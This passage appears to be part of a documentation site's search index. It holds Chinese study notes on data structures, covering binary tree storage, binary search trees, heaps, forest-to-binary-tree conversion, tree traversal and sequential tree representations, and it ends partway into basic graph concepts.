\u200b\u4e2d\u5e8f","text":""},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2005%20%E4%BA%8C%E5%8F%89%E6%A0%91/#43","title":"4.3 \u200b\u540e\u5e8f","text":""},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2005%20%E4%BA%8C%E5%8F%89%E6%A0%91/#5","title":"5. \u200b\u4e8c\u53c9\u6811\u200b\u7684\u200b\u5b58\u50a8\u200b\u7ed3\u6784","text":""},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2005%20%E4%BA%8C%E5%8F%89%E6%A0%91/#51","title":"5.1 \u200b\u52a8\u6001\u200b\u94fe\u5f0f\u200b\u5b58\u50a8","text":"<p>\u200b\u5404\u200b\u7ed3\u70b9\u200b\u968f\u673a\u200b\u5b58\u50a8\u200b\u5728\u200b\u5185\u5b58\u7a7a\u95f4\u200b\uff0c\u200b\u7ed3\u70b9\u200b\u4e4b\u95f4\u200b\u5173\u7cfb\u200b\u7528\u200b\u6307\u9488\u200b\u8868\u793a\u200b\u3002 </p> <p>\u200b\u9664\u200b\u5b58\u50a8\u200b\u7ed3\u70b9\u200b\u672c\u8eab\u200b\u6570\u636e\u200b\u5916\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u7ed3\u70b9\u200b\u518d\u200b\u8bbe\u7f6e\u200b\u4e24\u4e2a\u200b\u6307\u9488\u200b\u5b57\u200b\u6bb5\u200bleft\u200b\u548c\u200bright\uff0c\u200b\u5206\u522b\u200b\u6307\u5411\u200b\u5de6\u200b\u5b69\u5b50\u200b\u548c\u200b\u53f3\u200b\u5b69\u5b50\u200b\uff1b</p> <p>\u200b\u5b50\u5973\u200b\u4e3a\u200b\u7a7a\u65f6\u200b\u6307\u9488\u200b\u4e3a\u7a7a\u200b\u6307\u9488\u200b</p> <p>\u200b\u8fd9\u79cd\u200b\u5b58\u50a8\u200b\u7ed3\u6784\u200b\u79f0\u4e3a\u200b\u4e8c\u53c9\u200b\u94fe\u8868\u200b\u8868\u793a\u6cd5\u200b</p> <p>\u200b\u4e09\u53c9\u200b\u94fe\u8868\u200b</p> <p>\u200b\u9664\u200b left \u200b\u548c\u200b right \u200b\u6307\u9488\u200b\u5916\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u7ed3\u70b9\u200b\u518d\u200b\u589e\u52a0\u200b\u4e00\u4e2a\u200b\u6307\u5411\u200b\u7236\u200b\u8282\u70b9\u200b\u7684\u200b\u6307\u9488\u200b parent\uff0c\u200b\u5f62\u6210\u200b\u201c\u200b\u4e09\u53c9\u200b\u94fe\u8868\u200b\u201d</p> <p>\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u201c\u200b\u5411\u4e0a\u200b\u201d\u200b\u8bbf\u95ee\u200b\u7684\u200b\u80fd\u529b\u200b</p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2005%20%E4%BA%8C%E5%8F%89%E6%A0%91/#52","title":"5.2 \u200b\u9759\u6001\u200b\u6570\u7ec4\u200b\u5b58\u50a8\u200b(\u200b\u5b8c\u5168\u200b\u4e8c\u53c9\u6811\u200b)","text":""},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2005%20%E4%BA%8C%E5%8F%89%E6%A0%91/#6","title":"6. \u200b\u4e8c\u53c9\u200b\u641c\u7d22\u200b\u6811","text":"<p>\u200b\u4e8c\u53c9\u200b\u641c\u7d22\u200b\u6811\u200b\uff08BST\uff09\uff0c\u200b\u4e5f\u200b\u79f0\u200b\u4e8c\u53c9\u200b\u6392\u5e8f\u200b\u6811\u200b</p> <ul> <li>\u200b\u6216\u8005\u200b\u662f\u200b\u4e00\u9897\u200b\u7a7a\u6811\u200b\uff1b</li> <li>\u200b\u6216\u8005\u200b\u662f\u200b\u5177\u6709\u200b\u4e0b\u5217\u200b\u6027\u8d28\u200b\u7684\u200b\u4e8c\u53c9\u6811\u200b\uff1a<ul> <li>\u200b\u5bf9\u4e8e\u200b\u4efb\u4f55\u200b\u4e00\u4e2a\u200b\u7ed3\u70b9\u200b\uff0c\u200b\u8bbe\u5176\u503c\u200b\u4e3a\u200bK\uff0c\u200b\u5219\u200b\u8be5\u200b\u7ed3\u70b9\u200b\u7684\u200b\u5de6\u5b50\u200b\u6811\u200b(\u200b\u82e5\u4e0d\u7a7a\u200b)\u200b\u7684\u200b\u4efb\u610f\u200b\u4e00\u4e2a\u200b\u7ed3\u70b9\u200b\u7684\u200b\u503c\u200b\u90fd\u200b\u5c0f\u4e8e\u200bK\uff1b</li> <li>\u200b\u8be5\u200b\u7ed3\u70b9\u200b\u7684\u200b\u53f3\u5b50\u200b\u6811\u200b(\u200b\u82e5\u4e0d\u7a7a\u200b)\u200b\u7684\u200b\u4efb\u610f\u200b\u4e00\u4e2a\u200b\u7ed3\u70b9\u200b\u7684\u200b\u503c\u200b\u90fd\u200b\u5927\u4e8e\u200bK\uff1b</li> <li>\u200b\u800c\u4e14\u200b\u5b83\u200b\u7684\u200b\u5de6\u53f3\u200b\u5b50\u6811\u200b\u4e5f\u200b\u5206\u522b\u200b\u4e3a\u200b\u4e8c\u53c9\u200b\u641c\u7d22\u200b\u6811\u200b</li> </ul> </li> </ul> <p>\u200b\u4e8c\u53c9\u200b\u641c\u7d22\u200b\u6811\u200b\u7684\u200b\u6027\u8d28\u200b</p> <ul> <li>\u200b\u6309\u7167\u200b\u4e2d\u5e8f\u200b\u5468\u6e38\u200b\u5c06\u200b\u5404\u200b\u7ed3\u70b9\u200b\u6253\u5370\u200b\u51fa\u6765\u200b\uff0c\u200b\u5c06\u200b\u5f97\u5230\u200b\u7531\u5c0f\u5230\u5927\u200b\u7684\u200b\u6392\u5217\u200b</li> <li>\u200b\u6811\u4e2d\u200b\u7ed3\u70b9\u200b\u7684\u200b\u503c\u200b\u552f\u4e00\u200b</li> </ul>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2005%20%E4%BA%8C%E5%8F%89%E6%A0%91/#7","title":"7. \u200b\u5806\u200b\u4e0e\u200b\u4f18\u5148\u200b\u961f\u5217","text":""},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2005%20%E4%BA%8C%E5%8F%89%E6%A0%91/#71","title":"7.1 \u200b\u5806\u200b\u7684\u200b\u6027\u8d28","text":"<ul> <li>\u200b\u5806\u4e2d\u200b\u50a8\u5b58\u200b\u7684\u200b\u6570\u636e\u200b\u5c40\u90e8\u200b\u6709\u5e8f\u200b\uff08\u200b\u4e0e\u200bBST\u200b\u6811\u200b\u4e0d\u540c\u200b\uff09</li> <li>\u200b\u7ed3\u70b9\u200b\u4e0e\u5176\u200b\u5b50\u5973\u200b\u503c\u200b\u4e4b\u95f4\u200b\u5b58\u5728\u200b\u5927\u5c0f\u200b\u6bd4\u8f83\u200b\u5173\u7cfb\u200b</li> <li>\u200b\u4e24\u79cd\u200b\u5806\u200b\uff08\u200b\u6700\u5927\u200b\u3001\u200b\u6700\u5c0f\u200b\uff09</li> <li>\u200b\u5144\u5f1f\u200b\u4e4b\u95f4\u200b\u6ca1\u6709\u200b\u9650\u5b9a\u200b\u5927\u5c0f\u200b\u5173\u7cfb\u200b</li> <li>\u200b\u5806\u200b\u4e0d\u200b\u552f\u4e00\u200b</li> <li>\u200b\u662f\u200b\u4e00\u68f5\u200b\u53ef\u7528\u200b\u6570\u7ec4\u200b\u8868\u793a\u200b\u7684\u200b\u5b8c\u5168\u200b\u4e8c\u53c9\u6811\u200b</li> </ul>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2006%20%E6%A0%91/","title":"Chapter 06 \u200b\u6811","text":""},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2006%20%E6%A0%91/#1","title":"1. \u200b\u6811\u200b\u7684\u200b\u5b9a\u4e49","text":"<p>\u200b\u6811\u662f\u200b\u5305\u62ec\u200bn\u200b\u4e2a\u200b\u7ed3\u70b9\u200b\u7684\u200b\u6709\u9650\u200b\u96c6\u5408\u200b T\uff08n\u22651\uff09\uff0c\u200b\u4f7f\u5f97\u200b\uff1a</p> <ul> <li>\u200b\u4e00\u4e2a\u200b\u6839\u200b\u7ed3\u70b9\u200b</li> <li>\u200b\u9664\u6839\u200b\u4ee5\u5916\u200b\u7684\u200b\u5176\u5b83\u200b\u7ed3\u70b9\u200b\u88ab\u200b\u5206\u6210\u200bm\u200b\u4e2a\u200b(m\u22650)\u200b\u4e0d\u200b\u76f8\u4ea4\u200b\u7684\u200b\u96c6\u5408\u200bT1\uff0cT2\uff0c\u2026\uff0cTm\uff0c\u200b\u800c\u4e14\u200b\u8fd9\u4e9b\u200b\u96c6\u5408\u200b\u7684\u200b\u6bcf\u200b\u4e00\u4e2a\u200b\u53c8\u200b\u90fd\u200b\u662f\u200b\u6811\u200b\u3002 \u200b\u6811\u200bT1\uff0cT2\uff0c\u2026\uff0cTm\u200b\u79f0\u4f5c\u200b\u8fd9\u4e2a\u200b\u6839\u7684\u5b50\u200b\u6811\u200b</li> </ul> <p>\u200b\u56db\u79cd\u200b\u8868\u793a\u6cd5\u200b: </p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2006%20%E6%A0%91/#11","title":"1.1 \u200b\u6709\u5e8f\u200b\u6811","text":"<p>\u200b\u628a\u200b\u6811\u200b\u7ed3\u70b9\u200b\u7684\u200b\u5b50\u200b\u7ed3\u70b9\u200b\u6309\u200b\u4ece\u5de6\u5230\u53f3\u200b\u7684\u200b\u6b21\u5e8f\u200b\u7f16\u53f7\u200b.</p> <p>Warning</p> <p>\u200b\u5ea6\u200b\u5c0f\u4e8e\u200b\u7b49\u4e8e\u200b 2 \u200b\u7684\u200b\u6709\u5e8f\u200b\u6811\u200b\u5e76\u4e0d\u4e00\u5b9a\u200b\u662f\u200b\u4e8c\u53c9\u6811\u200b</p> <p>\u200b\u8fd9\u200b\u662f\u56e0\u4e3a\u200b\u6811\u200b\u7684\u200b\u5b69\u5b50\u200b\u4e0d\u200b\u533a\u5206\u200b\u5de6\u53f3\u200b, \u200b\u5f53\u200b\u7b2c\u200b 1 \u200b\u5b50\u200b\u8282\u70b9\u200b\u88ab\u200b\u5220\u9664\u200b\u540e\u200b, \u200b\u7b2c\u200b 2 \u200b\u5b50\u200b\u8282\u70b9\u200b\u81ea\u52a8\u200b\u79f0\u4e3a\u200b\u7b2c\u200b 1 \u200b\u5b50\u200b\u8282\u70b9\u200b. \u200b\u4f46\u662f\u200b\u4e8c\u53c9\u6811\u200b\u4e2d\u200b\u5220\u9664\u200b\u5de6\u5b50\u200b\u6811\u540e\u200b\u53f3\u5b50\u200b\u6811\u200b\u4e0d\u80fd\u200b\u66ff\u4ee3\u200b\u5de6\u5b50\u200b\u6811\u200b.</p> <p>\u200b\u53ea\u6709\u200b\u4e25\u683c\u200b\u533a\u5206\u200b\u5de6\u53f3\u4e24\u4e2a\u200b\u5b50\u200b\u8282\u70b9\u200b\u7684\u200b\u6709\u5e8f\u200b\u6811\u624d\u200b\u662f\u200b\u4e8c\u53c9\u6811\u200b.</p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2006%20%E6%A0%91/#12","title":"1.2 \u200b\u68ee\u6797","text":"<p>\u200b\u96f6\u68f5\u200b\u6216\u200b\u591a\u68f5\u200b\u4e0d\u200b\u76f8\u4ea4\u200b\u7684\u200b\u6811\u200b\u7684\u200b\u96c6\u5408\u200b.</p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2006%20%E6%A0%91/#2","title":"2. \u200b\u68ee\u6797\u200b\u4e0e\u200b\u4e8c\u53c9\u6811\u200b\u7684\u200b\u7b49\u4ef7\u200b\u8f6c\u6362","text":""},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2006%20%E6%A0%91/#21-","title":"2.1 \u200b\u68ee\u6797\u200b-&gt;\u200b\u4e8c\u53c9\u6811","text":"<p>\u200b\u8f6c\u6362\u200b\u8fc7\u7a0b\u200b: - \u200b\u5144\u5f1f\u200b\u4e4b\u95f4\u200b\u52a0\u7ebf\u200b (\u200b\u68ee\u6797\u200b\u4e4b\u95f4\u200b\u7684\u200b\u6839\u200b\u4e5f\u200b\u52a0\u7ebf\u200b) - \u200b\u4ece\u200b\u7b2c\u4e8c\u4e2a\u200b\u5b50\u200b\u7ed3\u70b9\u200b\u5f00\u59cb\u200b\u65ad\u5f00\u200b\u4e0e\u200b\u7236\u200b\u7ed3\u70b9\u200b\u7684\u200b\u8fb9\u200b - \u200b\u9002\u5f53\u200b\u65cb\u8f6c\u200b\u4e3a\u200b\u4e8c\u53c9\u6811\u200b</p> <p></p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2006%20%E6%A0%91/#22-","title":"2.2 \u200b\u4e8c\u53c9\u6811\u200b-&gt;\u200b\u68ee\u6797","text":"<p>\u200b\u8f6c\u6362\u200b\u8fc7\u7a0b\u200b\u5373\u200b\u4e3a\u200b\u68ee\u6797\u200b-&gt;\u200b\u4e8c\u53c9\u6811\u200b\u7684\u200b\u9006\u200b\u8fc7\u7a0b\u200b.</p> <ul> <li>\u200b\u52a0\u7ebf\u200b: \u200b\u82e5\u200bp\u200b\u7ed3\u70b9\u200b\u662f\u200b\u7236\u200b\u7ed3\u70b9\u200b\u7684\u200b\u5de6\u200b\u5b69\u5b50\u200b\uff0c\u200b\u5219\u200b\u5c06\u200bp\u200b\u7684\u200b\u53f3\u200b\u5b69\u5b50\u200b\uff0c\u200b\u53f3\u200b\u5b69\u5b50\u200b\u7684\u200b\u53f3\u200b\u5b69\u5b50\u200b\uff0c\u2026\u2026\u200b\u6cbf\u200b\u5206\u652f\u200b\u627e\u5230\u200b\u7684\u200b\u6240\u6709\u200b\u53f3\u200b\u5b69\u5b50\u200b\uff0c\u200b\u90fd\u200b\u4e0e\u200bp\u200b\u7684\u200b\u53cc\u4eb2\u200b\u7528\u7ebf\u200b\u8fde\u200b\u8d77\u6765\u200b</li> <li>\u200b\u5220\u7ebf\u200b: \u200b\u5220\u9664\u200b\u6240\u6709\u200b\u7ed3\u70b9\u200b\u548c\u200b\u53f3\u200b\u5b69\u5b50\u200b\u7684\u200b\u8fde\u7ebf\u200b.</li> <li>\u200b\u9002\u5f53\u200b\u65cb\u8f6c\u200b.</li> </ul> <p>Tips</p> <p>\u200b\u5bf9\u4e8e\u200b\u68ee\u6797\u200b, \u200b\u53ef\u4ee5\u200b\u770b\u4f5c\u200b\u589e\u52a0\u200b\u4e00\u4e2a\u200b\u865a\u70b9\u200b, \u200b\u865a\u70b9\u200b\u5411\u200b\u68ee\u6797\u200b\u4e2d\u200b\u6bcf\u200b\u4e00\u68f5\u6811\u200b\u7684\u200b\u6839\u200b\u8fde\u7ebf\u200b.</p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2006%20%E6%A0%91/#3","title":"3. \u200b\u6811\u200b\u7684\u200b\u5468\u6e38","text":""},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2006%20%E6%A0%91/#31","title":"3.1 \u200b\u5148\u6839\u200b\u6b21\u5e8f","text":"<p>\u200b\u82e5\u6811\u200b\u975e\u7a7a\u200b\uff0c\u200b\u5219\u200b\u904d\u5386\u200b\u65b9\u6cd5\u200b\u4e3a\u200b\uff1a - \u200b\u8bbf\u95ee\u200b\u6839\u200b\u7ed3\u70b9\u200b - \u200b\u4ece\u5de6\u5230\u53f3\u200b\uff0c\u200b\u4f9d\u6b21\u200b\u5148\u6839\u200b\u904d\u5386\u200b\u6839\u200b\u7ed3\u70b9\u200b\u7684\u200b\u6bcf\u200b\u4e00\u68f5\u200b\u5b50\u6811\u200b</p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2006%20%E6%A0%91/#32","title":"3.2 \u200b\u540e\u6839\u200b\u6b21\u5e8f","text":"<p>\u200b\u82e5\u6811\u200b\u975e\u7a7a\u200b\uff0c\u200b\u5219\u200b\u904d\u5386\u200b\u65b9\u6cd5\u200b\u4e3a\u200b\uff1a - \u200b\u4ece\u5de6\u5230\u53f3\u200b\uff0c\u200b\u4f9d\u6b21\u200b\u540e\u6839\u200b\u904d\u5386\u200b\u6839\u200b\u7ed3\u70b9\u200b\u7684\u200b\u6bcf\u200b\u4e00\u68f5\u200b\u5b50\u6811\u200b - \u200b\u8bbf\u95ee\u200b\u6839\u200b\u7ed3\u70b9\u200b</p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2006%20%E6%A0%91/#33","title":"3.3 \u200b\u5468\u6e38\u200b\u6027\u8d28","text":"<p>\u200b\u6309\u5148\u6839\u200b\u6b21\u5e8f\u200b\u5468\u6e38\u200b\u6811\u200b\u6b63\u597d\u200b\u7b49\u4e8e\u200b\u5bf9\u5e94\u200b\u4e8c\u53c9\u6811\u200b\u7684\u200b\u524d\u5e8f\u200b\u5468\u6e38\u200b</p> <p>\u200b\u6309\u540e\u200b\u6839\u200b\u6b21\u5e8f\u200b\u5468\u6e38\u200b\u6811\u200b\u6b63\u597d\u200b\u7b49\u4e8e\u200b\u5bf9\u5e94\u200b\u4e8c\u53c9\u6811\u200b\u7684\u200b\u4e2d\u5e8f\u200b\u5468\u6e38\u200b</p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2006%20%E6%A0%91/#4","title":"4. \u200b\u6811\u200b\u7684\u200b\u94fe\u5f0f\u200b\u5b58\u50a8","text":""},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2006%20%E6%A0%91/#41","title":"4.1 \u200b\u5b50\u200b\u7ed3\u70b9\u200b\u8868\u793a\u6cd5","text":""},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2006%20%E6%A0%91/#42","title":"4.2 \u200b\u52a8\u6001\u200b\u7ed3\u70b9\u200b\u8868\u793a\u6cd5","text":""},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2006%20%E6%A0%91/#43","title":"4.3 \u200b\u5de6\u200b\u5b69\u5b50\u200b\u53f3\u200b\u5144\u5f1f\u200b\u6cd5","text":"<p> \u200b\u672c\u8d28\u200b\u4e0a\u200b\uff0c\u200b\u662f\u200b\u4f7f\u7528\u200b\u4e8c\u53c9\u6811\u200b\u6765\u200b\u66ff\u6362\u200b\u6811\u200b</p> <p>\u200b\u4f18\u70b9\u200b: \u200b\u6bcf\u4e2a\u200b\u7ed3\u70b9\u200b\u6240\u200b\u9700\u200b\u7a7a\u95f4\u200b\u4e00\u81f4\u200b.</p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2006%20%E6%A0%91/#44","title":"4.4 \u200b\u7236\u200b\u6307\u9488\u200b\u8868\u793a\u6cd5","text":""},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2006%20%E6%A0%91/#5","title":"5. \u200b\u6811\u200b\u7684\u200b\u987a\u5e8f\u5b58\u50a8","text":""},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2006%20%E6%A0%91/#51","title":"5.1 \u200b\u5e26\u53f3\u94fe\u200b\u7684\u200b\u5148\u6839\u200b\u6b21\u5e8f\u200b\u8868\u793a\u6cd5","text":"<p>\u200b\u6838\u5fc3\u200b\u89c2\u5bdf\u200b: - \u200b\u5148\u5e8f\u200b\u904d\u5386\u200b\u4e2d\u200b, \u200b\u5b50\u6811\u200b\u7684\u200b\u6240\u6709\u200b\u7ed3\u70b9\u200b\u8fde\u7eed\u200b\u6392\u5217\u200b. - \u200b\u5982\u679c\u200b\u4e00\u4e2a\u200b\u7ed3\u70b9\u200b\u6709\u5b50\u200b\u8282\u70b9\u200b, \u200b\u5148\u5e8f\u200b\u904d\u5386\u200b\u4e2d\u8be5\u200b\u7ed3\u70b9\u200b\u7684\u200b\u540e\u200b\u4e00\u4e2a\u200b\u7ed3\u70b9\u200b\u4e00\u5b9a\u200b\u662f\u200b\u5b83\u200b\u7684\u200b\u7b2c\u4e00\u4e2a\u200b\u5b50\u200b\u7ed3\u70b9\u200b.</p> <p>\u200b\u56e0\u6b64\u200b, \u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u4e00\u4e2a\u200b ltag \u200b\u6807\u8bb0\u200b\u662f\u5426\u200b\u6709\u5b50\u200b\u8282\u70b9\u200b. 0 \u200b\u8868\u793a\u200b\u6709\u5b50\u200b\u8282\u70b9\u200b, 1 \u200b\u8868\u793a\u200b\u65e0\u5b50\u200b\u8282\u70b9\u200b (\u200b\u8fd9\u200b\u4e00\u70b9\u200b\u975e\u5e38\u200b\u53cd\u5e38\u200b), \u200b\u4e14\u200b\u5148\u5e8f\u200b\u904d\u5386\u200b\u4e2d\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u7ed3\u70b9\u200b\u5c31\u662f\u200b\u7b2c\u4e00\u4e2a\u200b\u5b50\u200b\u7ed3\u70b9\u200b. \u200b\u518d\u7528\u200b rlink \u200b\u6307\u5411\u200b\u8be5\u200b\u7ed3\u70b9\u200b\u7684\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u5144\u5f1f\u200b, \u200b\u8fd9\u6837\u200b\u5c31\u200b\u5b9e\u73b0\u200b\u4e86\u200b\u5de6\u200b\u5b69\u5b50\u200b\u53f3\u200b\u5144\u5f1f\u200b\u8868\u793a\u6cd5\u200b. \u200b\u7528\u200b 0/1 \u200b\u4ee3\u66ff\u200b llink \u200b\u8282\u7701\u200b\u4e86\u200b\u7a7a\u95f4\u200b.</p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2006%20%E6%A0%91/#52","title":"5.2 \u200b\u5e26\u53cc\u200b\u6807\u8bb0\u200b\u4f4d\u200b\u7684\u200b\u5148\u6839\u200b\u6b21\u5e8f\u200b\u8868\u793a\u6cd5","text":"<p>\u200b\u4e8b\u5b9e\u4e0a\u200b, \u200b\u5e26\u53f3\u94fe\u200b\u7684\u200b\u5148\u6839\u200b\u6b21\u5e8f\u200b\u8868\u793a\u6cd5\u200b\u4e2d\u200b\u7684\u200b rlink \u200b\u4e5f\u200b\u4e0d\u662f\u200b\u5fc5\u987b\u200b\u7684\u200b.</p> <p>\u200b\u6211\u4eec\u200b\u4f7f\u7528\u200b rtag \u200b\u6807\u8bb0\u200b. rtag \u200b\u4e3a\u200b 1 \u200b\u8868\u793a\u200b\u65e0\u200b\u5144\u5f1f\u200b, rtag \u200b\u4e3a\u200b 0 \u200b\u8868\u793a\u200b\u6709\u200b\u5144\u5f1f\u200b (\u200b\u8fd9\u200b\u4e00\u70b9\u200b\u975e\u5e38\u200b\u53cd\u5e38\u200b)</p> <ul> <li> <p>\u200b\u5f53\u200b\u4e00\u4e2a\u200b\u7ed3\u70b9\u200bx\u200b\u7684\u200brtag\u200b\u4e3a\u200b1\u200b\u65f6\u200b\uff0c\u200b\u5b83\u200b\u7684\u200brlink\u200b\u663e\u7136\u200b\u5e94\u4e3a\u200b\u7a7a\u200b</p> </li> <li> <p>\u200b\u5f53\u200b\u4e00\u4e2a\u200b\u7ed3\u70b9\u200bx\u200b\u7684\u200brtag\u200b\u4e3a\u200b0\u200b\u65f6\u200b\uff0c\u200b\u5b83\u200b\u7684\u200brlink\u200b\u5e94\u200b\u6307\u5411\u200b\u7ed3\u70b9\u200b\u5e8f\u5217\u200b\u4e2d\u6392\u200b\u5728\u200b\u4ee5\u200b\u7ed3\u70b9\u200bx\u200b\u4e3a\u6839\u200b\u7684\u200b\u5b50\u6811\u4e2d\u200b\u6700\u540e\u200b\u7ed3\u70b9\u200b\u7684\u200b\u540e\u9762\u200b\u7684\u200b\u90a3\u4e2a\u200b\u7ed3\u70b9\u200by</p> </li> </ul> <p>\u200b\u6709\u200b\u5144\u5f1f\u200b\u7684\u200b\u7ed3\u70b9\u200b(rtag=0)\uff0c\u200b\u90fd\u200b\u552f\u4e00\u200b\u5bf9\u5e94\u200b\u4e00\u4e2a\u200b\u65e0\u200b\u5b69\u5b50\u200b\u7684\u200b\u7ed3\u70b9\u200b(ltag=1)\uff0c\u200b\u6210\u200b\u5bf9\u200b\u51fa\u73b0\u200b\uff0c\u200b\u6ee1\u8db3\u200b\u6808\u200b\u7279\u6027\u200b\uff0c\u200b\u5373\u200b</p> <ul> <li>\u200b\u626b\u63cf\u200b\u5230\u200b\u4e00\u4e2a\u200brtag\u200b\u4e3a\u200b0\u200b\u7684\u200b\u7ed3\u70b9\u200b\u5c31\u200b\u5c06\u200b\u5b83\u200b\u8fdb\u6808\u200b</li> <li>\u200b\u626b\u63cf\u200b\u5230\u200b\u4e00\u4e2a\u200bltag\u200b\u4e3a\u200b1\u200b\u7684\u200b\u7ed3\u70b9\u200b\u5c31\u200b\u4ece\u200b\u6808\u9876\u200b\u5f39\u51fa\u200b\u4e00\u4e2a\u200b\u7ed3\u70b9\u200b\uff0c\u200b\u5e76\u200b\u4e3a\u200b\u5176\u200b\u8bbe\u7f6e\u200brlink\uff0c\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u8981\u200b\u8bfb\u51fa\u200b\u7684\u200b\u8282\u70b9\u200b\u5373\u200b\u4e3a\u200b\u5176\u200b\u5144\u5f1f\u200b\u8282\u70b9\u200b </li> </ul>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2006%20%E6%A0%91/#53","title":"5.3 \u200b\u5e26\u200b\u5ea6\u6570\u200b\u7684\u200b\u540e\u200b\u6839\u200b\u6b21\u5e8f\u200b\u8868\u793a\u6cd5","text":""},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2006%20%E6%A0%91/#54","title":"5.4 \u200b\u5e26\u53cc\u200b\u6807\u8bb0\u200b\u7684\u200b\u5c42\u6b21\u200b\u6b21\u5e8f\u200b\u8868\u793a","text":"<p>\u200b\u987a\u5e8f\u200b\u626b\u63cf\u200b\u5e26\u53cc\u200b\u6807\u8bb0\u200b\u7684\u200b\u5c42\u6b21\u200b\u6b21\u5e8f\u200b\u5e8f\u5217\u200b</p> <ul> <li> <p>\u200b\u5982\u679c\u200b\u7ed3\u70b9\u200b\u7684\u200bltag\u200b\u503c\u4e3a\u200b1\uff0c\u200b\u5219\u200b\u7f6e\u200b\u5176\u200bllink\u200b\u4e3a\u7a7a\u200b\uff1b\u200b\u5f53\u200b\u7ed3\u70b9\u200b\u7684\u200bltag\u200b\u4e3a\u200b0\u200b\u65f6\u200b\uff0c\u200b\u8be5\u200b\u7ed3\u70b9\u200b\u5165\u200b\u961f\u5217\u200b\uff1b</p> </li> <li> <p>\u200b\u5982\u679c\u200b\u7ed3\u70b9\u200b\u7684\u200brtag\u200b\u503c\u4e3a\u200b0\uff0c\u200b\u90a3\u4e48\u200b\u5176\u540e\u200b\u7684\u200b\u7ed3\u70b9\u200by\u200b\u5c31\u662f\u200b\u5176\u53f3\u200b\u5144\u5f1f\u200b\uff1b</p> </li> <li> <p>\u200b\u5426\u5219\u200b\uff0c\u200b\u5982\u679c\u200b\u7ed3\u70b9\u200b\u7684\u200brtag\u200b\u503c\u4e3a\u200b1\uff0c\u200b\u5219\u200brlink\u200b\u4e3a\u7a7a\u200b\uff0c\u200b\u6b64\u65f6\u200b\u51fa\u200b\u961f\u5217\u200bx\uff0c\u200b\u5e76\u200b\u5c06\u200bx\u200b\u7684\u200bllink\u200b\u6307\u5411\u200b\u5e8f\u5217\u200b\u4e2d\u200b\u540e\u7eed\u200b\u7ed3\u70b9\u200b y\u200b\u5373\u53ef\u200b\u3002</p> </li> </ul>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2007%20%E5%9B%BE/","title":"Chapter 07 \u200b\u56fe","text":""},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2007%20%E5%9B%BE/#71","title":"7.1 \u200b\u56fe\u200b\u7684\u200b\u57fa\u672c\u6982\u5ff5","text":"<p>\u200b\u7528\u200b </p> \\[ G=(V,E) \\] <p>\u200b\u4ee3\u8868\u200b\u4e00\u4e2a\u200b\u56fe\u200b, \\(V\\) \u200b\u4e3a\u200b\u9876\u70b9\u200b\u96c6\u5408\u200b, \\(E\\) \u200b\u4e3a\u8fb9\u200b\u96c6\u5408\u200b.</p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2007%20%E5%9B%BE/#711","title":"7.1.1 \u200b\u56fe\u200b\u7684\u200b\u96c6\u5408\u200b\u8868\u793a","text":"<p>\u200b\u65e0\u5411\u200b\u56fe\u200b: \\(\\{(V_1,V_2),...\\}\\) \u200b\u5706\u200b\u62ec\u5f27\u200b</p> <p>\u200b\u6709\u5411\u56fe\u200b: \\(\\{\\langle V_1,V_2\\rangle,...\\}\\) \u200b\u5c16\u200b\u62ec\u5f27\u200b</p> <p>\u200b\u5728\u200b\u672c\u7ae0\u200b\u540e\u7eed\u200b\u56fe\u200b\u8868\u793a\u200b\u4e2d\u200b, \u200b\u4e0d\u200b\u8003\u8651\u200b\u9876\u70b9\u200b\u5230\u200b\u81ea\u8eab\u200b\u7684\u200b\u8fb9\u200b, \u200b\u4e0d\u200b\u5141\u8bb8\u200b\u4e00\u6761\u200b\u8fb9\u200b\u5728\u200b\u56fe\u200b\u4e2d\u200b\u91cd\u590d\u200b\u51fa\u73b0\u200b. (\u200b\u65e0\u81ea\u73af\u200b\u548c\u200b\u91cd\u8fb9\u200b)</p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2007%20%E5%9B%BE/#712","title":"7.1.2 \u200b\u56fe\u200b\u7684\u200b\u76f8\u5173\u200b\u6982\u5ff5","text":"<ul> <li>\u200b\u76f8\u90bb\u200b\u9876\u70b9\u200b(\u200b\u90bb\u63a5\u200b\u70b9\u200b): \u200b\u4e00\u6761\u200b\u8fb9\u200b\u6240\u200b\u8fde\u63a5\u200b\u7684\u200b\u4e24\u4e2a\u200b\u9876\u70b9\u200b, 